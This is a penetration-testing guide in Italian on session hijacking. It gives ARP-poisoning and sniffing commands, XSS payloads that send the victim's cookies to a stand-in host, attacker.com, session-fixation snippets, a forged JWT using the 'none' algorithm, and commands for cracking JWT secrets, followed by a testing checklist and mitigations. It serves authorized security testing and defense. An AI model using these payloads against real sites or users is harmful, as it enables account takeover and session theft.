# Session Hijacking

## Scopo

Questa guida copre le tecniche di Session Hijacking, che permettono a un attaccante di impersonare un utente legittimo rubando o manipolando token di sessione.

## Prerequisiti

- Conoscenza HTTP/HTTPS
- Cookie e token JWT
- Burp Suite, Wireshark
- **Autorizzazione per testing**

---

## Concetto

```
La gestione sessione si basa su token che identificano l'utente.
Se un attaccante ottiene il token, può impersonare la vittima.

Vettori:
1. Sniffing di rete
2. XSS per rubare cookie
3. Session Fixation
4. Brute force session ID
5. Session prediction
```

---

## Tipi di Attacco

| Tipo | Descrizione | Difficoltà |
|------|-------------|------------|
| Sniffing | Intercettazione traffico | Facile (HTTP) |
| XSS | Furto via JavaScript | Moderata |
| Fixation | Forza session ID noto | Moderata |
| Prediction | Indovina session ID | Difficile |
| Sidejacking | Hijack su rete WiFi | Facile |

---

## Session Sniffing

### Wireshark

```bash
# Cattura HTTP cookies
sudo wireshark -i eth0 -f "port 80"

# Filtro
http.cookie

# O con tshark
tshark -i eth0 -f "port 80" -Y "http.cookie"
```

### Ettercap

```bash
# ARP poisoning + sniffing
sudo ettercap -T -q -i eth0 -M arp:remote /GATEWAY// /VICTIM//
```

### Bettercap

```bash
sudo bettercap -iface eth0
> net.sniff on
> set net.sniff.regexp '(?i)(session|cookie|token)'
```

---

## XSS Cookie Stealing

### Payload Base

```html
<script>
document.location="http://attacker.com/steal?c="+document.cookie;
</script>

<script>
new Image().src="http://attacker.com/steal?c="+document.cookie;
</script>

<script>
fetch("http://attacker.com/steal?c="+document.cookie);
</script>
```

### Bypass HttpOnly

```
Cookie HttpOnly = non accessibile via JavaScript

Bypass:
- TRACE method (XST - vecchio)
- PhpInfo disclosure
- Error pages che mostrano header
- Session ID in URL
```

---

## Session Fixation

### Concetto

```
1. Attaccante ottiene session ID valido
2. Forza vittima a usare quel session ID
3. Vittima si autentica
4. Attaccante usa stesso session ID (ora autenticato)
```

### Via URL

```html
<!-- Link con session ID -->
<a href="http://target/login?PHPSESSID=abc123">Login</a>

<!-- Iframe nascosto -->
<iframe src="http://target/?PHPSESSID=abc123" style="display:none"></iframe>
```

### Via Cookie

```html
<!-- Se domain non validato -->
<script>
document.cookie = "PHPSESSID=abc123; domain=.target.com; path=/";
</script>

<!-- Meta refresh -->
<meta http-equiv="Set-Cookie" content="PHPSESSID=abc123">
```

---

## Session Prediction

### Weak Session ID

```python
# Esempio session ID debole
import time
session_id = str(time.time())  # Prevedibile!

# Analisi pattern
# Osserva più session ID per trovare pattern
s1 = "sess_1000001"
s2 = "sess_1000002"
s3 = "sess_1000003"
# Pattern: incrementale!
```

### Burp Sequencer

```
1. Intercetta response con session cookie
2. Send to Sequencer
3. Start live capture
4. Analizza entropia
5. Valuta randomness
```

---

## JWT Attacks

### None Algorithm

```python
import base64
import json

# Header originale
header = {"alg": "HS256", "typ": "JWT"}

# Cambia a none
header = {"alg": "none", "typ": "JWT"}

# Payload modificato
payload = {"user": "admin", "role": "admin"}

# Codifica senza signature
token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')
token += '.' + base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')
token += '.'
```

### Weak Secret

```bash
# Brute force con hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Con jwt_tool
python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt
```

### Key Confusion

```bash
# RS256 → HS256 attack
# Usa chiave pubblica come secret HMAC
python3 jwt_tool.py JWT_TOKEN -X k -pk public.pem
```

---

## Tools

### Burp Suite

```
1. Proxy > HTTP history
2. Trova session cookie
3. Session handling rules
4. Test session behaviors
```

### jwt_tool

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 jwt_tool.py [JWT] -T  # Tampering
python3 jwt_tool.py [JWT] -C  # Crack
python3 jwt_tool.py [JWT] -X  # Exploits
```

---

## Session Management Testing

### Checklist

```
□ Session ID cambia dopo login?
□ Session invalidata dopo logout?
□ Timeout sessione implementato?
□ Cookie flags: HttpOnly, Secure, SameSite?
□ Session ID sufficientemente random?
□ Rigenerazione dopo privilege change?
```

### Burp Repeater

```
1. Login, cattura session cookie
2. Logout
3. Prova riutilizzare vecchio cookie
4. Se funziona = session non invalidata
```

---

## Mitigazioni

### Cookie Flags

```
Set-Cookie: session=abc123; 
    HttpOnly;      # No JavaScript access
    Secure;        # Solo HTTPS
    SameSite=Strict;  # No cross-site
    Path=/;
    Max-Age=3600
```

### Session Management

```python
# Rigenera session dopo login
session.regenerate()

# Invalida completamente al logout
session.destroy()

# Timeout inattività
if (now - last_activity) > TIMEOUT:
    session.destroy()
```

### Token Best Practices

```
- Minimo 128 bit di entropia
- CSPRNG (Cryptographically Secure)
- Associa a IP/User-Agent (opzionale)
- Breve durata + refresh token
```

---

## Best Practices

- **HTTPS**: Sempre per applicazioni autenticate
- **Testing**: Verifica tutti gli aspetti della gestione sessione
- **Minimal Info**: Non esporre session in URL
- **Logging**: Monitora anomalie (IP changes, etc)
- **Reporting**: Documenta tutti i finding

## Riferimenti

- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [PortSwigger Session Attacks](https://portswigger.net/web-security/authentication)
- [jwt_tool](https://github.com/ticarpi/jwt_tool)
- [JWT Attacks](https://portswigger.net/web-security/jwt)
